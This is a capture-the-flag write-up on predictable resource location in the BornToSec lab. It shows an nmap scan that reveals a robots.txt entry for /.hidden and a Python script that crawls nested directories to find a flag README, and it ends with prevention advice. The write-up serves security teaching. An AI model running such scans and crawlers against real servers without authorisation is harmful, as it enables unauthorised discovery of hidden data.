# Predictable Resource Location

## Description
Attackers guess or brute-force file and directory names to locate hidden resources on a server.

## BornToSec
As i did the Hard Coded Credentials Exploit, I knew that there was a `hidden` folder in the project. 

Just to remind, i discover these hidden folders by using the following command:

```bash
nmap -v -A 10.11.249.222
```

And I get 

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.4.6 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: BornToSec - Web Section
|_http-favicon: Unknown favicon MD5: E7D08792AE6EC9DBBF3CEBFB48EE4057
| http-robots.txt: 2 disallowed entries 
|_/whatever /.hidden
|_http-server-header: nginx/1.4.6 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Now we still have a problem, in the `.hidden` folder, there is 28 folders that contains also 28 folders and so on. But there is only 3 levels of folders. And the bottom level of folders contains a `README`. So thats too much to do it manually but we can do it with a script.

```python
import requests
from urllib.parse import urljoin

def find_flag_readme(base_url):
    """
    Recursively search through nested directories to find README with flag.
    
    Args:
        base_url (str): Base URL to start searching from
    
    Returns:
        str: URL of README containing flag, or None if not found
    """
    def fetch_directory_contents(url):
        """Fetch directory contents, returning list of links."""
        try:
            response = requests.get(url)
            response.raise_for_status()
            
            links = []
            for line in response.text.split('\n'):
                if 'href="' in line and not 'Parent Directory' in line:
                    link = line.split('href="')[1].split('"')[0]
                    links.append(link)
            
            return links
        except Exception as e:
            print(f"Error fetching {url}: {e}")
            return []

    def recursive_search(current_url, depth=0):
        """Recursively search directories up to 3 levels deep."""
        if depth > 3:
            return None

        try:
            contents = fetch_directory_contents(current_url)
            
            for item in contents:
                full_url = urljoin(current_url, item)
                print(f"Searching {full_url}")
                
                if item.upper() == 'README':
                    readme_response = requests.get(full_url)
                    readme_response.raise_for_status()
                    
                    if 'flag' in readme_response.text:
                        print(f"Flag found in: {full_url}")
                        return full_url
                
                if item.endswith('/'):
                    result = recursive_search(full_url, depth + 1)
                    if result:
                        return result
        
        except Exception as e:
            print(f"Error searching {current_url}: {e}")
        
        return None

    return recursive_search(base_url)

def main():
    base_url = 'http://10.11.249.222/.hidden/'
    flag_readme_url = find_flag_readme(base_url)
    
    if flag_readme_url:
        flag_response = requests.get(flag_readme_url)
        print("Flag contents:", flag_response.text.strip())
    else:
        print("No flag README found.")

if __name__ == "__main__":
    main()
```

With this script, we are able to find the flag in the `README` file in the `/.hidden` folder.

## How to prevent it
- Implement Proper Access Controls: Ensure that sensitive resources are not accessible to unauthorized users.
- Use Randomized Resource Locations: Avoid predictable paths for sensitive resources to make them harder to find.
- Monitor for Brute Force Attempts: Implement rate limiting or CAPTCHAs to prevent automated guessing of resource locations.
- Use Intrusion Detection Systems (IDS): Monitor for suspicious activity that may indicate an attacker is attempting to locate hidden resources.